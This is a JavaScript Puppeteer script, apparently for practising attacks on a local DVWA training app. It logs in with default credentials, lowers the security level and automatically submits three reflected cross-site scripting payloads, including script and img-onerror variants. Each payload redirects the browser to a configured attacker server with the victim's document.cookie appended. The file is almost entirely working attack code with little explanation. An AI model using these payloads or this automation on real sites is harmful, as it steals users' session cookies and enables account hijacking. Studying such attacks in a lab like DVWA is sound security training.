const puppeteer = require("puppeteer")
const {
    targetURL,
    attackerServer,
    Levels
} = require('./config.js')

// To delay the time for scrapingbot to load contents
const delay = (time) => {
    return new Promise(function (resolve) {
        setTimeout(resolve, time)
    });
}
/**
 * This is to practice auto scraping for Cross Site Scripting (Reflected).
 *  
 * @param {str} targetURL DVWA URL locally running in your computer
 * @param {str[]} attacks an array of string (script tags)
 * @param {Levels} level Enum class (Levels) declared on config.js
 */
const xssAutoReflected = async (targetURL, attacks, level) => {

    // Launch a headless Chromium for scraping.
    const browser = await puppeteer.launch({
        headless: false
    })
    const page = await browser.newPage();
    await page.goto(targetURL);

    // Login to DVWA webpage
    await page.$eval('input[name=username]', el => el.value = 'admin')
    await page.$eval('input[name=password]', el => el.value = 'password')
    await delay(3000);
    await page.click('input[type="submit"]');


    // Check the Level and set to the value passed as a parameter (level)
    await page.click('#main_menu_padded > ul:nth-child(3) > li:nth-child(1) > a')
    await page.select('#main_body > div > form > select', level)
    await delay(3000);
    await page.click('input[type="submit"]');
    await delay(3000);
    //Try attacks on the array and see whether all the attacks are performed well. 
    for (let i = 0; i < attacks.length; i++) {
        console.log(`${i+1}th Attack Start`)
        await page.click('#main_menu_padded > ul:nth-child(2) > li:nth-child(11) > a')


        console.log("Sending a user cookie to the backend")
        await page.$eval('input[name="name"]', (el, attack) => {
            el.value = attack
        }, attacks[i])
        await delay(3000)

        console.log("Sent")
        await page.click('input[type="submit"]');

        await delay(3000);
        console.log(`${i+1}th Attack End`)
        await page.goBack()
    }
    // Close the browser
    await browser.close();
}

attacksXssReflected = [
    "<script>window.location='" + attackerServer + "/session/'+document.cookie</script>",
    "<SCRIPT>window.location='" + attackerServer + "/session/'+document.cookie</SCRIPT>",
    "<img src/onerror=window.location='" + attackerServer + "/session/'+document.cookie>",
]

xssAutoReflected(targetURL, attacksXssReflected, Levels.low)